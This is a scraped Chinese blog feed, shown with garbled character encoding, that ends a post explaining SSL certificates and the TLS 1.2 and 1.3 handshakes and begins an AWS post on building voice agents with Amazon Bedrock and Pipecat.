<li><strong>æœåŠ¡å™¨åŸŸå</strong>ï¼šè¯ä¹¦ç»‘å®šçš„åŸŸå / IPï¼Œç¡®ä¿å®¢æˆ·ç«¯è®¿é—®çš„æ˜¯ç›®æ ‡æœåŠ¡å™¨ï¼›</li>
<li><strong>å…¬é’¥</strong>ï¼šç”¨äºåŠ å¯†é€šä¿¡æ•°æ®æˆ–éªŒè¯æ•°å­—ç­¾åï¼Œå¯å…¬å¼€ä¼ è¾“ï¼›</li>
<li><strong>ç§é’¥</strong>ï¼šç”±æœåŠ¡å™¨æŒæœ‰ï¼Œç”¨äºè§£å¯†å…¬é’¥åŠ å¯†çš„æ•°æ®æˆ–ç”Ÿæˆæ•°å­—ç­¾åï¼Œéœ€ä¸¥æ ¼ä¿å¯†ï¼›</li>
<li><strong>è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰ä¿¡æ¯</strong>ï¼šç­¾å‘è¯ä¹¦çš„æƒå¨æœºæ„ï¼ŒåŒ…å« CA çš„æ•°å­—ç­¾åï¼›</li>
<li><strong>è¯ä¹¦æœ‰æ•ˆæœŸ</strong>ï¼šè¯ä¹¦çš„ç”Ÿæ•ˆå’Œè¿‡æœŸæ—¶é—´ï¼Œè¿‡æœŸåéœ€é‡æ–°ç­¾å‘ã€‚</li>
</ol>
<p>SSLè¯ä¹¦å¯é˜²æ­¢<strong>ä¸­é—´äººæ”»å‡»</strong>å’Œ<strong>åŸŸååŠ«æŒ</strong>ã€‚</p>
<ul>
<li>å®¢æˆ·ç«¯ï¼ˆå¦‚æµè§ˆå™¨ï¼‰è®¿é—® HTTPS ç½‘ç«™æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå‘å®¢æˆ·ç«¯å‡ºç¤º SSL è¯ä¹¦ï¼›</li>
<li>å®¢æˆ·ç«¯é€šè¿‡å†…ç½®çš„ CA ä¿¡ä»»åˆ—è¡¨ï¼ŒéªŒè¯è¯ä¹¦æ˜¯å¦ç”±å¯ä¿¡ CA ç­¾å‘ã€æ˜¯å¦åœ¨æœ‰æ•ˆæœŸå†…ã€æ˜¯å¦ç»‘å®šå½“å‰è®¿é—®çš„åŸŸåï¼›</li>
<li>è‹¥éªŒè¯é€šè¿‡ï¼Œç¡®è®¤æœåŠ¡å™¨èº«ä»½åˆæ³•ï¼›è‹¥éªŒè¯å¤±è´¥ï¼ˆå¦‚è¯ä¹¦ä¼ªé€ ã€è¿‡æœŸã€åŸŸåä¸åŒ¹é…ï¼‰ï¼Œæµè§ˆå™¨ä¼šå¼¹å‡ºå®‰å…¨è­¦å‘Šï¼Œæç¤ºç”¨æˆ·åœæ­¢è®¿é—®ã€‚</li>
</ul>
<p>å…¸å‹çš„æ¯”å¦‚www.bilibili.comå’Œwww.bi1iXXXX.com.
è¿™æ ·å°±å¯ä»¥è§£å†³<strong>èº«ä»½å¯èƒ½è¢«ä¼ªé€ </strong>çš„é—®é¢˜</p>
<h5 data-id="heading-53">MAC</h5>
<ul>
<li>TLS 1.2ï¼šé€šè¿‡å°†æ˜æ–‡æ•°æ®ã€æ´¾ç”Ÿçš„ MAC å¯†é’¥ç­‰å‚æ•°ç» HMAC ç®—æ³•ç®—å‡º MAC å€¼å¹¶éšåŠ å¯†æ•°æ®ä¸€åŒä¼ è¾“ï¼Œæ¥æ”¶æ–¹è§£å¯†åé‡æ–°è®¡ç®— MAC å€¼æ¯”å¯¹æ¥åˆ¤æ–­æŠ¥æ–‡æ˜¯å¦è¢«ä¿®æ”¹ã€‚</li>
<li>TLS 1.3ï¼šå€ŸåŠ© AEAD ç®—æ³•åœ¨åŠ å¯†æ•°æ®æ—¶åŒæ­¥ç”Ÿæˆè®¤è¯æ ‡ç­¾ï¼Œæ¥æ”¶æ–¹è§£å¯†è¿‡ç¨‹ä¸­è‡ªåŠ¨éªŒè¯è¯¥æ ‡ç­¾ï¼Œä»¥æ­¤åˆ¤æ–­æŠ¥æ–‡æ˜¯å¦è¢«ä¿®æ”¹ã€‚</li>
</ul>
<p>è¿™æ ·å¯ä»¥è§£å†³httpçš„ç¬¬ä¸‰ä¸ªå®‰å…¨é—®é¢˜â€”â€”<strong>æŠ¥æ–‡å¯èƒ½è¢«ç¯¡æ”¹</strong></p>
<h5 data-id="heading-54">TLS1.2æ¡æ‰‹è¿‡ç¨‹</h5>
<p>ä¸‹é¢æ˜¯å…·ä½“çš„TLS1.2çš„æ¡æ‰‹è¿‡ç¨‹</p>
<ol>
<li><strong>å®¢æˆ·ç«¯é—®å€™ï¼ˆClient Helloï¼‰</strong> ï¼šå®¢æˆ·ç«¯å‘é€æ”¯æŒçš„ TLS ç‰ˆæœ¬ã€åŠ å¯†å¥—ä»¶åˆ—è¡¨ã€éšæœºæ•°Â <code>Client Random</code>ï¼Œå¹¶é™„å¸¦ä¼šè¯ IDï¼ˆç”¨äºä¼šè¯å¤ç”¨ï¼‰ã€‚</li>
<li><strong>æœåŠ¡å™¨é—®å€™ï¼ˆServer Helloï¼‰</strong> ï¼šæœåŠ¡å™¨ä»å®¢æˆ·ç«¯åˆ—è¡¨ä¸­é€‰å®š TLS ç‰ˆæœ¬å’ŒåŠ å¯†å¥—ä»¶ï¼Œè¿”å›éšæœºæ•°Â <code>Server Random</code>ï¼Œå¹¶ç¡®è®¤ä¼šè¯ IDã€‚</li>
<li><strong>æœåŠ¡å™¨è¯ä¹¦ä¸å¯†é’¥äº¤æ¢</strong>ï¼šæœåŠ¡å™¨å‘é€è‡ªèº« SSL è¯ä¹¦ï¼ˆå«å…¬é’¥ï¼‰ï¼›è‹¥ä½¿ç”¨ RSA ç­‰éå¯¹ç§°åŠ å¯†å¥—ä»¶ï¼Œç›´æ¥ç­‰å¾…å®¢æˆ·ç«¯åŠ å¯†å¯†é’¥ï¼›è‹¥ä½¿ç”¨ DH/ECDHE ç­‰å¯†é’¥åå•†ç®—æ³•ï¼Œå‘é€æœåŠ¡å™¨ç«¯å¯†é’¥äº¤æ¢å‚æ•°ã€‚</li>
<li><strong>æœåŠ¡å™¨é—®å€™å®Œæˆï¼ˆServer Hello Doneï¼‰</strong> ï¼šæœåŠ¡å™¨é€šçŸ¥å®¢æˆ·ç«¯ï¼Œé—®å€™é˜¶æ®µç»“æŸã€‚</li>
<li><strong>å®¢æˆ·ç«¯å¯†é’¥äº¤æ¢</strong>ï¼šå®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨è¯ä¹¦åˆæ³•æ€§åï¼Œç”Ÿæˆ<strong>é¢„ä¸»å¯†é’¥ï¼ˆPre-Master Secretï¼‰</strong> ï¼Œç”¨æœåŠ¡å™¨<strong>å…¬é’¥åŠ å¯†å</strong>å‘é€ç»™æœåŠ¡å™¨ï¼›æœåŠ¡å™¨ç”¨ç§é’¥è§£å¯†å¾—åˆ°é¢„ä¸»å¯†é’¥ã€‚</li>
<li><strong>å¯†é’¥æ´¾ç”Ÿ</strong>ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åˆ†åˆ«ä½¿ç”¨Â <code>Client Random</code>ã€<code>Server Random</code>ã€é¢„ä¸»å¯†é’¥ï¼Œé€šè¿‡ PRF ç®—æ³•æ´¾ç”Ÿ<strong>ä¸»å¯†é’¥ï¼ˆMaster Secretï¼‰</strong> ï¼Œå†ç”±ä¸»å¯†é’¥ç”Ÿæˆä¼šè¯å¯†é’¥ï¼ˆåŒ…æ‹¬åŠ å¯†å¯†é’¥ã€MAC å¯†é’¥ï¼‰ã€‚</li>
<li><strong>å®¢æˆ·ç«¯å®Œæˆï¼ˆClient Finishedï¼‰</strong> ï¼šå®¢æˆ·ç«¯ç”¨ä¼šè¯å¯†é’¥åŠ å¯†æ¡æ‰‹æ¶ˆæ¯æ‘˜è¦ï¼Œå‘é€Â <code>Finished</code>Â æ¶ˆæ¯ï¼ŒéªŒè¯æ¡æ‰‹è¿‡ç¨‹æœªè¢«ç¯¡æ”¹ã€‚</li>
<li><strong>æœåŠ¡å™¨å®Œæˆï¼ˆServer Finishedï¼‰</strong> ï¼šæœåŠ¡å™¨åŒç†åŠ å¯†æ¡æ‰‹æ¶ˆæ¯æ‘˜è¦ï¼Œå‘é€Â <code>Finished</code>Â æ¶ˆæ¯ï¼›åŒæ–¹éªŒè¯é€šè¿‡åï¼Œæ¡æ‰‹å®Œæˆï¼Œåç»­ç”¨ä¼šè¯å¯†é’¥åŠ å¯†ä¼ è¾“åº”ç”¨æ•°æ®ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9d68c47e13c4af1b47bca98cb624231~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSp5aSp5omt56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042669&amp;x-signature=TjMZUUJfrOqWC9DtHyjpwrIL7oo%3D" alt="aadb211658a6e930da20470e140779d1.jpg" loading="lazy"/></p>
<p>æ‰€ä»¥æ•´ä¸ªæµç¨‹æ˜¯éå¯¹ç§°åŠ å¯†çš„ï¼Œæ¡æ‰‹ä¹‹ååˆ™æ˜¯å¯¹ç§°åŠ å¯†ï¼Œé‚£ä¹ˆéå¯¹ç§°åŠ å¯†çš„å¯†é’¥ä¸ºä»€ä¹ˆä¸ä¼šæ³„éœ²å‘¢ï¼Ÿæ•´ä¸ªå¯†é’¥æ˜¯æœ‰é¢„ä¸»å¯†é’¥+Client Random+Server Randomç”Ÿæˆçš„ï¼Œè€Œä¸”é¢„ä¸»å¯†é’¥å¹¶æ²¡æœ‰åœ¨ç½‘ç»œä¸Šæš´éœ²ï¼Œåªæ˜¯æš´éœ²çš„åŠ å¯†åçš„é¢„ä¸»å¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥å°±ç®—æš´éœ²ï¼Œä»–äººä¹Ÿæ— æ³•è§£æï¼Œå› ä¸ºç§é’¥åœ¨æœåŠ¡å™¨ä¸Šï¼Œæ‰€æœ‰å°±å½¢æˆäº†å®‰å…¨çš„å¯¹ç§°åŠ å¯†ã€‚</p>
<h5 data-id="heading-55">TLS1.3æ¡æ‰‹è¿‡ç¨‹</h5>
<p>TLS 1.3 æ¡æ‰‹çš„æ ¸å¿ƒç›®æ ‡æ˜¯Â <strong>æç®€äº¤äº’ã€1-RTT æ—¶å»¶ã€å¼ºåˆ¶å‰å‘å®‰å…¨</strong>ï¼Œä¸»æµåˆ†ä¸º<strong>åŸºç¡€ 1-RTT æ¡æ‰‹</strong>ï¼ˆé¦–æ¬¡è¿æ¥ï¼‰å’ŒÂ <strong>0-RTT å¿«é€Ÿæ¡æ‰‹</strong>ï¼ˆä¼šè¯å¤ç”¨ï¼‰ä¸¤ç§æ¨¡å¼ï¼Œä»¥ä¸‹æ˜¯è¯¦ç»†æ­¥éª¤ï¼š</p>
<p><strong>åŸºç¡€ 1-RTT æ¡æ‰‹ï¼ˆé¦–æ¬¡è¿æ¥ï¼Œå•å‘è®¤è¯åœºæ™¯ï¼‰</strong></p>
<p>å•å‘è®¤è¯æ˜¯æœ€å¸¸è§çš„åœºæ™¯ï¼ˆå¦‚æµè§ˆå™¨è®¿é—® HTTPS ç½‘ç«™ï¼‰ï¼Œä»…æœåŠ¡å™¨éœ€æä¾›è¯ä¹¦ï¼Œæµç¨‹å…± 2 è½®äº¤äº’ï¼š</p>
<ol>
<li>
<p><strong>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šå‘é€ Client Hello</strong></p>
<ul>
<li>å®¢æˆ·ç«¯å‘é€æ”¯æŒçš„ TLS 1.3 ç‰ˆæœ¬ã€AEAD åŠ å¯†å¥—ä»¶åˆ—è¡¨ï¼ˆå¦‚ AES-GCMï¼‰ã€<code>Client Random</code>Â éšæœºæ•°ã€ä¼šè¯ IDï¼ˆç”¨äºåç»­å¤ç”¨ï¼‰ã€‚</li>
<li><strong>æ ¸å¿ƒæ–°å¢</strong>ï¼šæºå¸¦å®¢æˆ·ç«¯ç”Ÿæˆçš„Â <strong>ECDHE ä¸´æ—¶å…¬é’¥</strong>ï¼Œæå‰å¯åŠ¨å¯†é’¥åå•†æµç¨‹ã€‚</li>
<li>å¯é€‰é™„å¸¦æ‰©å±•ä¿¡æ¯ï¼ˆå¦‚æ”¯æŒçš„ 0-RTT åŠŸèƒ½ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šå‘é€ Server Hello + è¯ä¹¦ + Finished</strong></p>
<ul>
<li>æœåŠ¡å™¨é€‰å®šåŠ å¯†å¥—ä»¶å’ŒÂ <code>Server Random</code>Â éšæœºæ•°ï¼Œè¿”å›Â <strong>æœåŠ¡å™¨ ECDHE ä¸´æ—¶å…¬é’¥</strong>ï¼Œä¸å®¢æˆ·ç«¯å…¬é’¥é…å¯¹è®¡ç®—å…±äº«å¯†é’¥ã€‚</li>
<li>æœåŠ¡å™¨å‘é€ SSL è¯ä¹¦ï¼ˆå«é•¿æœŸå…¬é’¥ï¼‰ï¼Œä¾›å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨èº«ä»½ã€‚</li>
<li><strong>æµç¨‹ç®€åŒ–å…³é”®</strong>ï¼šæ— éœ€å‘é€Â <code>Server Hello Done</code>ï¼Œç›´æ¥ç”¨æ´¾ç”Ÿçš„ä¼šè¯å¯†é’¥åŠ å¯†æ¡æ‰‹æ¶ˆæ¯æ‘˜è¦ï¼Œå‘é€Â <code>Finished</code>Â æ¶ˆæ¯ã€‚</li>
</ul>
</li>
<li>
<p><strong>åŒæ–¹å¯†é’¥æ´¾ç”Ÿ</strong></p>
<ul>
<li>å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦åˆæ³•åï¼Œç»“åˆåŒæ–¹ ECDHE ä¸´æ—¶å…¬é’¥è®¡ç®—Â <strong>å…±äº«å¯†é’¥</strong>ã€‚</li>
<li>åŒæ–¹é€šè¿‡ HKDF ç®—æ³•ï¼ŒåŸºäºÂ <code>Client Random</code>ã€<code>Server Random</code>Â å’Œå…±äº«å¯†é’¥ï¼Œç›´æ¥æ´¾ç”ŸÂ <strong>ä¼šè¯å¯†é’¥</strong>ï¼ˆæ— ä¸»å¯†é’¥ä¸­é—´å±‚ï¼ŒAEAD ç®—æ³•ç»Ÿä¸€å¤„ç†åŠ å¯†å’Œå®Œæ•´æ€§æ ¡éªŒï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šå‘é€ Finished</strong></p>
<ul>
<li>å®¢æˆ·ç«¯ç”¨ä¼šè¯å¯†é’¥åŠ å¯†æ¡æ‰‹æ¶ˆæ¯æ‘˜è¦ï¼Œå‘é€Â <code>Finished</code>Â æ¶ˆæ¯ã€‚</li>
<li>åŒæ–¹éªŒè¯å½¼æ­¤çš„Â <code>Finished</code>Â æ¶ˆæ¯é€šè¿‡åï¼Œæ¡æ‰‹å®Œæˆï¼Œåç»­ç”¨ä¼šè¯å¯†é’¥ä¼ è¾“åº”ç”¨æ•°æ®ã€‚</li>
</ul>
</li>
</ol>
<p><strong>0-RTT å¿«é€Ÿæ¡æ‰‹ï¼ˆä¼šè¯å¤ç”¨åœºæ™¯ï¼‰</strong></p>
<p>è‹¥å®¢æˆ·ç«¯æ›¾ä¸æœåŠ¡å™¨å»ºç«‹è¿‡è¿æ¥ï¼Œä¼šç¼“å­˜ä¼šè¯ç¥¨æ®å’Œå¯†é’¥å‚æ•°ï¼ŒäºŒæ¬¡è¿æ¥æ—¶å¯å®ç°Â <strong>é›¶å¾€è¿”æ—¶å»¶</strong>ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯åœ¨Â <code>Client Hello</code>Â ä¸­é™„å¸¦ç¼“å­˜çš„Â <strong>ä¼šè¯ç¥¨æ®</strong>ï¼ŒåŒæ—¶ç›´æ¥å‘é€Â <strong>ç”¨ç¼“å­˜å¯†é’¥åŠ å¯†çš„åº”ç”¨æ•°æ®</strong>ã€‚</li>
<li>æœåŠ¡å™¨éªŒè¯ä¼šè¯ç¥¨æ®åˆæ³•åï¼Œæ— éœ€é‡æ–°åå•†å¯†é’¥ï¼Œç›´æ¥è¿”å›Â <code>Finished</code>Â æ¶ˆæ¯å’ŒåŠ å¯†çš„å“åº”æ•°æ®ã€‚</li>
<li>åŒæ–¹ç›´æ¥è¿›å…¥æ•°æ®ä¼ è¾“é˜¶æ®µï¼Œæ— éœ€é¢å¤–æ¡æ‰‹äº¤äº’ã€‚</li>
</ol>
<h2 data-id="heading-56">ç»“è¯­</h2>
<p>æ„Ÿè§‰è‡ªå·±å˜å¼ºå£®äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨Amazon Bedrockå’ŒPipecatæ„å»ºä½å»¶è¿Ÿæ™ºèƒ½è¯­éŸ³Agent]]></title>    <link>https://juejin.cn/post/7582232741686738979</link>    <guid>https://juejin.cn/post/7582232741686738979</guid>    <pubDate>2025-12-11T07:25:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582232741686738979" data-draft-id="7582246395986542626" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨Amazon Bedrockå’ŒPipecatæ„å»ºä½å»¶è¿Ÿæ™ºèƒ½è¯­éŸ³Agent"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-11T07:25:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äºšé©¬é€Šäº‘å¼€å‘è€…"/> <meta itemprop="url" content="https://juejin.cn/user/2850395271209496"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨Amazon Bedrockå’ŒPipecatæ„å»ºä½å»¶è¿Ÿæ™ºèƒ½è¯­éŸ³Agent
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2850395271209496/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äºšé©¬é€Šäº‘å¼€å‘è€…
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:25:33.000Z" title="Thu Dec 11 2025 07:25:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs3.cn-north-1.amazonaws.com.cn%2Fawschinablog%2Fblogbanner-newnew.png" target="_blank" title="https://s3.cn-north-1.amazonaws.com.cn/awschinablog/blogbanner-newnew.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb0d59cb4ba6457582f87cd34f5f01e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042733&amp;x-signature=Tapqn9wX2%2FKDgOm36rWTWfiq9uU%3D" alt="" loading="lazy"/></a></p>
<p>åœ¨ç”Ÿæˆå¼AIä¸è¯­éŸ³äº¤äº’æŠ€æœ¯å¿«é€Ÿå‘å±•çš„å½“ä¸‹ï¼Œå¦‚ä½•é«˜æ•ˆæ„å»ºä½å»¶è¿Ÿã€ä¸ªæ€§åŒ–ã€è‡ªç„¶å¯¹è¯ä½“éªŒçš„æ™ºèƒ½è¯­éŸ³Agentï¼Œå·²é€æ¸æˆä¸ºä¸šç•Œå…³æ³¨çš„ç„¦ç‚¹ä¹‹ä¸€ã€‚</p>
<p>æ™ºèƒ½è¯­éŸ³Agentçš„åº”ç”¨é¢†åŸŸå¹¿æ³›ï¼ŒåŒ…æ‹¬æ™ºèƒ½è®¾å¤‡è¯­éŸ³äº¤äº’ï¼ˆå¦‚å…·èº«æœºå™¨äººã€æ™ºèƒ½éŸ³ç®±ï¼‰ã€ä¸ªäººåŠ©ç†ã€è‡ªåŠ¨åŒ–å®¢æœï¼ˆå¦‚é¤å…é¢„è®¢ã€é”€å”®ã€ä¿é™©ã€é¢„çº¦å®‰æ’ï¼‰ã€è¥é”€ã€è¯­è¨€æ•™å­¦ï¼ˆå¦‚è‹±è¯­å£è¯­å­¦ä¹ ï¼‰ã€å¥åº·åŒ»ç–—ä»¥åŠå¤šæ¨¡æ€å†…å®¹åˆ›ä½œç­‰ã€‚</p>
<p>æœ¬ç¯‡åšå®¢å°†é¦–å…ˆä»‹ç»æ„å»ºæ™ºèƒ½è¯­éŸ³Agentçš„æ ¸å¿ƒç»„ä»¶å’Œå»¶è¿Ÿä¼˜åŒ–å»ºè®®ï¼Œæ¥ç€å°†åˆ©ç”¨Pipecatå¼€æºæ¡†æ¶å’ŒAmazon BedrockæœåŠ¡ï¼Œæ‰“é€ ä¸€ä¸ªæ”¯æŒç”¨æˆ·æ‰“æ–­ã€å¤šè½®ä¸Šä¸‹æ–‡ç®¡ç†çš„å®æ—¶äº¤äº’æ™ºèƒ½è¯­éŸ³Agent</p>
<h2 data-id="heading-0">ä¸€ã€æ™ºèƒ½è¯­éŸ³Agentæ ¸å¿ƒç»„ä»¶</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fd2908q01vomqb2.cloudfront.net%2F472b07b9fcf2c2451e8781e944bf5f77cd8457c8%2F2025%2F10%2F20%2Fpipecat-agent-1.png" target="_blank" title="https://d2908q01vomqb2.cloudfront.net/472b07b9fcf2c2451e8781e944bf5f77cd8457c8/2025/10/20/pipecat-agent-1.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19e47cef1aab480490a85c1f0d486f89~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042733&amp;x-signature=gIBbot%2F3cKsD4H1rMKtbSfn7NV8%3D" alt="" loading="lazy"/></a></p>
<p>æ™ºèƒ½è¯­éŸ³Agentç»“åˆäº†åŸºç¡€æ¨¡å‹çš„æ–‡æœ¬/è¯­éŸ³è¯†åˆ«ã€ç†è§£å’Œæ¨ç†èƒ½åŠ›ï¼Œæ—¨åœ¨æä¾›å®æ—¶ã€è‡ªç„¶ã€è¿ç»­çš„è¯­éŸ³äº¤äº’ä½“éªŒã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ„å»ºæ™ºèƒ½è¯­éŸ³Agenté€šå¸¸éœ€è¦åŒ…å«ä»¥ä¸‹æ ¸å¿ƒç»„ä»¶ï¼š</p>
<ul>
<li><strong>VAD( Voice Activity Detection )</strong> ï¼šæ£€æµ‹éŸ³é¢‘ä¸­æ˜¯å¦å­˜åœ¨äººç±»è¯­éŸ³</li>
<li><strong>EOU(End of Turn/Utterance )</strong> Â ï¼šæ£€æµ‹è¯´è¯è€…æ˜¯å¦å·²ç»å®Œæˆäº†ä»–ä»¬çš„å‘è¨€</li>
<li><strong>STT (Speech To Text)</strong> ï¼šä¹Ÿç§°ä¸ºè‡ªåŠ¨è¯­éŸ³è¯†åˆ«ï¼ˆASRï¼‰ï¼Œå°†ç»™å®šéŸ³é¢‘è½¬å½•ä¸ºæ–‡æœ¬</li>
<li><strong>LLM</strong> <strong>å’Œ LLM Agent</strong>ï¼šå¤§è¯­è¨€æ¨¡å‹ï¼Œå¦‚ Amazon Nova/Nova Sonicï¼ŒDeepSeekï¼ŒAnthropic Claudeç³»åˆ—æ¨¡å‹</li>
